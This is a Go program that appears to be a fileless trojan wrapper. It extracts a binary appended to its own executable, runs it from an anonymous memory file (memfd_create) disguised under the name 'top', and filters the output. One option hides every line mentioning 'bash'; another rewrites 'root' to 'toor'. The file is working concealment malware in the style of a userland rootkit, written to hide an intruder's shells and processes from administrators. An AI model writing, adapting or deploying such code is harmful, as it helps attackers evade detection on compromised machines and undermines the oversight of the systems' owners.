package main

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

const (
	MFD_CLOEXEC      = 0x1
	SYS_MEMFD_CREATE = 319
	SELF_MARKER      = "END_OF_PROGRAM"
	PAYLOAD_MARKER   = "END_OF_PAYLOAD"
)

func main() {
	payload, plugin := parsePayload()
	execute(payload, plugin)
}

func memfdCreate(name string, flags int) (fd int, err error) {
	var _p0 *byte
	_p0, err = syscall.BytePtrFromString(name)

	if err != nil {
		return -1, err
	}

	r0, _, _ := syscall.Syscall(SYS_MEMFD_CREATE, uintptr(unsafe.Pointer(_p0)), uintptr(flags), 0)
	fd = int(r0)
	return
}

func command(f *os.File, args ...string) *exec.Cmd {
	return exec.CommandContext(context.Background(), f.Name(), args...)
}

func open(b []byte, name string) (*os.File, error) {
	fd, err := memfdCreate(name, MFD_CLOEXEC)
	if err != nil {
		return nil, err
	}

	f := os.NewFile(uintptr(fd), fmt.Sprintf("/proc/self/fd/%d", fd))

	if _, err := f.Write(b); err != nil {
		_ = f.Close()
		return nil, err
	}

	return f, nil
}

func parsePayload() ([]byte, string) {
	exe, _ := os.Executable()
	data, _ := ioutil.ReadFile(exe)
	index := bytes.LastIndex(data, []byte(SELF_MARKER))

	if index == -1 {
		return nil, ""
	}

	filePayload := data[index+len(SELF_MARKER):]
	index = bytes.LastIndex(data, []byte(PAYLOAD_MARKER))

	if index == -1 {
		return filePayload, ""
	}

	plugin := string(data[index+len(PAYLOAD_MARKER):])
	return filePayload, plugin
}

func execute(filePayload []byte, plugin string) {
	file, err := open(filePayload, "top")

	if err != nil {
		log.Fatal(err)
	}

	cmd := command(file, os.Args[1:]...)
	cmd.Stdin = os.Stdin
	cmd.Stderr = os.Stderr
	stdout, _ := cmd.StdoutPipe()

	if err := cmd.Start(); err != nil {
		log.Fatal(err)
	}

	handlePlugin(plugin, stdout)

	if err := cmd.Wait(); err != nil {
		log.Fatal(err)
	}
}

func handlePlugin(plugin string, stdout io.ReadCloser) {
	switch plugin {
	case "hide-bash":
		outputFilterLine(stdout, "bash")
	case "toor":
		outputReplaceAll(stdout, "root", "toor")
	default:
		output(stdout)
	}
}

func output(reader io.ReadCloser) error {
	buf := make([]byte, 1024)

	for {
		num, err := reader.Read(buf)
		if err != nil && err != io.EOF {
			return err
		}
		if num > 0 {
			fmt.Printf("%s", string(buf[:num]))
		}
	}
}

func outputFilterLine(reader io.ReadCloser, filterText string) error {
	scanner := bufio.NewScanner(reader)

	for scanner.Scan() {
		line := scanner.Text()
		if !strings.Contains(line, filterText) {
			fmt.Println(line)
		}
	}

	if err := scanner.Err(); err != nil && err != io.EOF {
		return err
	}

	return nil
}

func outputReplaceAll(reader io.ReadCloser, filterText string, replaceText string) error {
	scanner := bufio.NewScanner(reader)

	for scanner.Scan() {
		line := scanner.Text()
		fmt.Println(strings.ReplaceAll(line, filterText, replaceText))
	}

	if err := scanner.Err(); err != nil && err != io.EOF {
		return err
	}

	return nil
}
